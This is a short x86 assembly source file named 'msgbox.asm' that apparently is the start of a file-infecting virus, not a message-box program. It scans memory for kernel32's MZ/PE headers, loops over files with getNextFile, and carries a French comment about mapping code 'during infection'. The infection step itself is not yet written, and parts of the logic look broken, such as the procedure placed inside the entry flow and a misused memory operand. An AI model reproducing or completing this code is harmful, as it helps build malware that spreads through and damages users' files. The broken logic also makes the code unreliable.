; msgbox.asm
	
.386
.model flat, stdcall
option casemap:none

      include windows.inc
      include user32.inc
	  include kernel32.inc

	  include handle_file.inc


      includelib user32.lib
      includelib kernel32.lib

.data


.code

main:

extractKernel32PEHeader proc delta:dword

	and delta, 0FFFF0000h
l1:
	sub delta, 1000h
	cmp word ptr [delta], "MZ"
	jne l1

	mov eax, [delta + sizeof IMAGE_DOS_HEADER]
	cmp word ptr [eax], "PE"
	je return
	xor eax, eax

return:
	ret
extractKernel32PEHeader endp


	mov ebx, [esp]
	invoke extractKernel32PEHeader, ebx
	xor eax, eax

mloop:

;; sans doute mieux de tout mettre dans le meme fichier pour tout mapper lors de l'infection
	call getNextFile
	cmp eax, 0
	je endmloop
	push eax						;;	saves current file handle
	call CloseHandle
	jmp mloop

endmloop:

	mov esp, ebp
	pop ebp
	ret
endfile:
end	main